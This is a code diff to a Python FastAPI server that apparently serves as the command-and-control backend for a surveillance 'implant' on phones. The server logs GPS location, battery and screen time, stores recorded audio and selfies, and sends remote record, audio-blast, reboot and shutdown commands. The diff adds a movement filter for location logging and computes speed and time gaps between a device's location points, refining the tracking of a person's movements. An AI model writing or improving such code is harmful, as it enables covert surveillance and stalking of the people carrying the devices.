@@ -16,6 +16,7 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi import WebSocket, WebSocketDisconnect
 import json
 import asyncio
+import re
 
 SESSION_COOKIE_NAME = "session_token"
 SESSION_DURATION = 60 * 60 * 8  # 8 hours
@@ -30,6 +31,21 @@ AUDIO_DIR = os.path.join(PROTECTED_MEDIA_ROOT, "audio")
 SELFIE_DIR = os.path.join(PROTECTED_MEDIA_ROOT, "selfies")
 
 session_store: dict[str, float] = {}
+
+def validate_device_id(device_id: str) -> bool:
+    """Validate device ID format (alphanumeric, underscore, dash allowed)"""
+    if not device_id or not isinstance(device_id, str):
+        return False
+    return len(device_id) <= 256 and re.match(r'^[a-zA-Z0-9_\-]+$', device_id) is not None
+
+def validate_coordinates(lat: float, lon: float) -> bool:
+    """Validate GPS coordinates are within valid ranges"""
+    try:
+        lat_f = float(lat)
+        lon_f = float(lon)
+        return -90 <= lat_f <= 90 and -180 <= lon_f <= 180
+    except (ValueError, TypeError):
+        return False
 
 class ConnectionManager:
     def __init__(self):
@@ -596,9 +612,38 @@ async def websocket_endpoint(websocket: WebSocket):
                             c.execute('INSERT INTO daily_screen_time (device_id, date, minutes, updated_at) VALUES (?, ?, ?, ?)', (client_id, date_str, screen_time_minutes, now_unix))
                     
                     if loc_state_val == 1 and "lat" in data and "lon" in data:
-                        c.execute('''INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)
-                                     VALUES (?, ?, ?, ?, ?, ?)''',
-                                  (client_id, battery_val, lat_val, lon_val, time_str, now_unix))
+                        # Only record location if user MOVES > 5 meters (ignore GPS jitter)
+                        try:
+                            lat_val = float(lat_val)
+                            lon_val = float(lon_val)
+                            # Validate coordinates are in valid range
+                            if -90 <= lat_val <= 90 and -180 <= lon_val <= 180:
+                                # Get last recorded GPS point for this device
+                                c.execute('''SELECT lat, lon FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 1''', (client_id,))
+                                last_point = c.fetchone()
+                                
+                                should_record = True
+                                if last_point:
+                                    # Calculate Haversine distance to last point
+                                    lat1, lon1 = math.radians(last_point["lat"]), math.radians(last_point["lon"])
+                                    lat2, lon2 = math.radians(lat_val), math.radians(lon_val)
+                                    dlat = lat2 - lat1
+                                    dlon = lon2 - lon1
+                                    a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
+                                    c_val = 2 * math.asin(math.sqrt(a))
+                                    distance_m = 6371000 * c_val  # Earth radius in meters
+                                    
+                                    # Only record if moved > 5 meters
+                                    should_record = distance_m > 5
+                                
+                                if should_record:
+                                    c.execute('''INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)
+                                                 VALUES (?, ?, ?, ?, ?, ?)''',
+                                              (client_id, battery_val, lat_val, lon_val, time_str, now_unix))
+                            else:
+                                print(f"Invalid coordinates for {client_id}: lat={lat_val}, lon={lon_val}", flush=True)
+                        except (ValueError, TypeError) as e:
+                            print(f"Failed to record location for {client_id}: {e}", flush=True)
 
                     db.commit()
                     if is_new_connection:
@@ -782,9 +827,13 @@ async def receive_report(
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         """, (device_id, level, lat, lon, current_time_str, now_unix, ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd))
         
-    # Reset one-time power commands after they are successfully fetched by the implant
+    # Reset one-time commands after they are successfully fetched by the implant
     if reboot_cmd == 1 or shutdown_cmd == 1:
         c.execute("UPDATE devices SET reboot_cmd = 0, shutdown_cmd = 0 WHERE device_id = ?", (device_id,))
+    
+    # Reset audio_blast after it's been fetched
+    if play_audio != 0:
+        c.execute("UPDATE devices SET play_audio = 0 WHERE device_id = ?", (device_id,))
         
     c.execute("""
         INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)
@@ -943,8 +992,38 @@ async def get_history_detailed(
         c.execute("SELECT COUNT(*) FROM history WHERE device_id = ?", (device_id,))
     total = c.fetchone()[0]
     
+    # Calculate speed and gaps between points
+    history_data = []
+    for i, r in enumerate(rows):
+        speed = 0
+        gap = 0
+        if i > 0:
+            prev_r = rows[i - 1]
+            # Calculate time gap in seconds
+            gap = int(prev_r["unix_time"] - r["unix_time"])
+            # Haversine distance calculation
+            lat1, lon1 = math.radians(r["lat"]), math.radians(r["lon"])
+            lat2, lon2 = math.radians(prev_r["lat"]), math.radians(prev_r["lon"])
+            dlat = lat2 - lat1
+            dlon = lon2 - lon1
+            a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
+            c_val = 2 * math.asin(math.sqrt(a))
+            distance_m = 6371000 * c_val  # Earth radius in meters
+            # Speed in km/h
+            if gap > 0:
+                speed = (distance_m / 1000) / (gap / 3600)
+        history_data.append({
+            "lat": r["lat"], 
+            "lon": r["lon"], 
+            "level": r["level"], 
+            "time": r["timestamp"], 
+            "unix_time": r["unix_time"],
+            "speed": round(speed, 1),
+            "gap": gap
+        })
+    
     return {
-        "history": [{"lat": r["lat"], "lon": r["lon"], "level": r["level"], "time": r["timestamp"], "unix_time": r["unix_time"]} for r in rows],
+        "history": history_data,
         "total": total,
         "page": page,
         "per_page": per_page,
